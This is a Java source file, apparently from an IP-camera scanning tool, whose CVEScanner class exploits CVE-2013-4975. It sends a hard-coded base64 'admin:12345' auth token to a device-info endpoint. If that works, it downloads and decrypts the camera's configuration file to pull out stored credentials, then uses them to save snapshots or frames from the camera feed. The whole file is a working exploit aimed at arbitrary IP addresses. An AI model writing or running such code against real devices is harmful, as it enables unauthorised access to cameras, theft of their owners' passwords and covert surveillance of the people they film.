package scanner.runner.breaking.cve;

import lombok.extern.slf4j.Slf4j;
import okhttp3.Response;
import okhttp3.ResponseBody;
import scanner.Preferences;
import scanner.ffmpeg.FFmpegExecutor;
import scanner.http.HttpClient;
import scanner.onvif.OnvifScreenSaver;
import scanner.runner.Target;
import scanner.runner.breaking.Credentials;

import java.io.IOException;
import java.util.Objects;

import static scanner.Preferences.ALLOW_FRAME_SAVING;
import static scanner.runner.breaking.BreakType.*;

@Slf4j
public class CVEScanner {

    private static final String CVE_2013_4975 = "http://%s/system/deviceInfo?auth=YWRtaW46MTIzNDU=";
    private static final String CONFIG_FILE = "http://%s/System/configurationFile?auth=YWRtaW46MTIzNDU=";

    public Target scanning(String ip) {
        Credentials credentials = Credentials.empty();
        try (Response response = HttpClient.execute(String.format(CVE_2013_4975, ip))) {
            ResponseBody responseBody = response.body();
            if (Objects.nonNull(responseBody)) {
                String body = responseBody.string();
                if (body.contains("firmwareVersion")) {
                    try (Response configFile = HttpClient.execute(String.format(CONFIG_FILE, ip))) {
                        ResponseBody configFileBody = configFile.body();
                        credentials = (Objects.nonNull(configFileBody))
                                ? ConfigurationDecrypt.decrypt(configFileBody.byteStream())
                                : Credentials.empty();
                    }
                }
            }
        } catch (IOException iox) {
            log.debug("[{}] error during CVE checking: {}", ip, iox.getMessage());
        }

        if (credentials.isPresent()) {
            String creds = credentials.get();
            if (Preferences.check(ALLOW_FRAME_SAVING)) {
                boolean isSuccess = OnvifScreenSaver.saveSnapshot(ip);
                if (!isSuccess) {
                    FFmpegExecutor.saveFrame(creds, ip);
                }
            }
        }

        return Target.builder()
                .host(ip)
                .path("11")
                .credentials(credentials)
                .isFreeStream(false)
                .breakType(CVE)
                .build();
    }

}